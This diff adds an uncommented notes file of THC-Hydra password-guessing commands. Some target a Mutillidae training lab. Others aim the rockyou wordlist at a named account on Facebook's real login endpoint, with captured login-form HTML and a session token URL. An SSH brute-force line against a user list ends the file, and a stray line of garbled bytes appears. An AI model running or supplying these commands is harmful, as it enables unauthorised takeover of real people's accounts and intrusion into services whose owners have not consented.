@@ -1,0 +1,48 @@
+hydra 192.168.32.50 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+
+
+hydra -U http-post-form
+
+"/login.php:user=^USER^&pass=^PASS^:incorrect"
+
+
+http://192.168.32.50/mutillidae/index.php?page=login.php
+
+"/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+##########################################################################################
+FACEBOOK
+
+
+"/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc3NTk3NDI0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D:username=^USER^&password=^PASS^:incorrect"
+
+
+****************
+
+ hydra -l data.h.yokel -P /usr/share/wordlists/rockyou.txt ftp://157.240.236.35
+
+
+
+
+hydra 157.240.236.35 -l data.h.yokel -P /usr/share/wordlists/rockyou.txt https-post-form "/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc3NTk3NDI0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"
+
+
+****************
+https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc3NTk3NDI0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D
+
+
+https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028
+
+
+<div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number"></div>
+
+<div class="_6lux"><div class="_6luy _55r1 _1kbt _9nyh" id="passContainer"><input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Password" aria-label="Password"><div class="_9ls7 hidden_elem" id="u_0_7_BQ"><a href="#" role="button"><div class="_9lsa"><div class="_9lsb" id="u_0_8_Ee"></div></div></a></div></div></div>
+
+
+
+
+0Q0O0M0K0I0	+
+
+
+hydra -L users.txt -p butterfly 10.20.137.32 ssh
+
+
